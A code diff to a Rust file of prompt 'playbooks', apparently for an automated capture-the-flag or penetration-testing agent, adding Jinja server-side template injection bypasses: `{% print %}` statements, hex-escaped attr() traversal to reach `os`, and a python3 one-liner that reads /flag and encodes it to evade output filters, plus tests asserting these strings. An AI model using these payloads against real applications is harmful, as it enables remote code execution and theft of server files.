@@ -100,6 +100,15 @@ pub const PLAYBOOKS: &[Playbook] = &[
                Step 3 — when filters block `{}`, `_`, `.`, or `[]`:\n\
                - Retry encoded braces: `%7B%7B7*7%7D%7D`, double-encoded `%257B%257B7*7%257D%257D`, \
                  and unicode escapes if the app decodes before rendering.\n\
+               - If `{{...}}` is blocked but `{%...%}` is allowed, Jinja statement output still works: \
+                 `{% print 7*7 %}`. For Flask/Jinja attribute traversal without raw `_`, `.`, or `[]`, \
+                 use `attr('\\x5f\\x5fclass\\x5f\\x5f')`, `attr('\\x5f\\x5finit\\x5f\\x5f')`, \
+                 `attr('\\x5f\\x5fglobals\\x5f\\x5f')`, and `attr('\\x5f\\x5fgetitem\\x5f\\x5f')('os')`.\n\
+               - If the rendered value must match a numeric regex like `[0-9.]*`, do not print `id` \
+                 or `FLAG{...}` directly. Print fixed-width decimal bytes from `/flag` using a command \
+                 string with no raw dot/underscore, e.g. \
+                 `python3 -c 'print(getattr(\"\",\"join\")(map(lambda c:format(ord(c),\"03d\"),getattr(open(\"/flag\"),\"read\")())),end=\"\")'`, \
+                 then locally decode 3-digit chunks back to `FLAG{...}` before reporting/submitting.\n\
                - Test stored fields rendered later: profile name, address, notes, loan purpose, \
                  comments, and admin-visible pages. A rejected calculator field does not clear \
                  stored profile SSTI.\n\
@@ -461,6 +470,10 @@ mod tests {
     fn ssti_playbook_covers_encoded_and_stored_jinja_surfaces() {
         let prompt = compose_playbook_prompt(&["ssti".to_string()]);
         assert!(prompt.contains("%7B%7B7*7%7D%7D"));
+        assert!(prompt.contains("{% print 7*7 %}"));
+        assert!(prompt.contains("attr('\\x5f\\x5fclass\\x5f\\x5f')"));
+        assert!(prompt.contains("fixed-width decimal bytes"));
+        assert!(prompt.contains("3-digit chunks"));
         assert!(prompt.contains("stored fields rendered later"));
         assert!(prompt.contains("Flask/Jinja targets"));
         assert!(prompt.contains("Content-Length"));
